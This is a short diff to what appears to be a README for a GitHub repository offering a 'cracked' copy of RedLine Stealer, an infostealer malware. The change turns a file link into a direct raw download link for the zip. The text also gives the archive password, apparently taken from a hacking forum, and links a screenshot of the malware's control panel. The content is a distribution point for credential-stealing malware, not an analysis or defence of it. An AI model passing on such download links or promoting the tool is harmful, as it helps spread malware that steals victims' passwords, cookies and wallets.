@@ -12,7 +12,7 @@
 
 Password: hackforums.net
 
-Download: (https://github.com/SpiceSpuffy/RedlineStealer20Cracked/blob/main/RedLine%20Stealer%20Cracked.zip)
+Download: (https://github.com/SpiceSpuffy/RedlineStealer20Cracked/raw/main/RedLine%20Stealer%20Cracked.zip)
 
 Panel screenshot:
 ![image](https://user-images.githubusercontent.com/104257061/170255475-04fe28b1-7cc8-4d1a-908b-10aab58b70da.png)
